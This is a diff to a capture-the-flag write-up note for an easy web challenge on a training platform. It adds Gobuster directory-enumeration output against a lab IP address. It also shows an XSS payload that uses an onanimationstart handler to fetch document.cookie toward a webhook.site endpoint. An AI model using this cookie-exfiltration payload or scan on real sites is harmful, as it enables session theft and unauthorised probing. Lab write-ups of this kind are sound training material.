@@ -3,7 +3,7 @@ tags:
   - 🚩
 up:
   - "[[02 - (incomplete) Data Exfiltration]]"
-platform: HackTheBox
+platform: BKSec Training
 difficulty: Easy
 creation_date: 2026-02-08
 last_modified: 2026-02-08
@@ -27,7 +27,25 @@ last_modified: 2026-02-08
 ### Gobuster Enumeration
 I tried running `Gobuster` against the URL:
 ```bash
-
+gobuster dir --url http://103.77.175.40:8051 --wordlist ~/Downloads/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt       
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://103.77.175.40:8051
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/kali/Downloads/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 17769 / 17769 (100.00%)
+===============================================================
+Finished
+===============================================================
 ````
 
 ### Website Recon
@@ -65,7 +83,7 @@ The tools also help me generate the test payload:
 
 ![[Pasted image 20260208121153.png]]
 
-The payload worked so all I had to do left is setup a webhook using `webhook.site` and forge a new payload that is fetching the webhook using cookies as parameters.
+The payload worked so all I had to do left is set up a webhook using `webhook.site` and forge a new payload that is fetching the webhook using cookies as parameters.
 ```html
 <style>@keyframes x{}</style>
 <h1 style="animation-name:x" onanimationstart="fetch('?c='+document.cookie)"></h1>
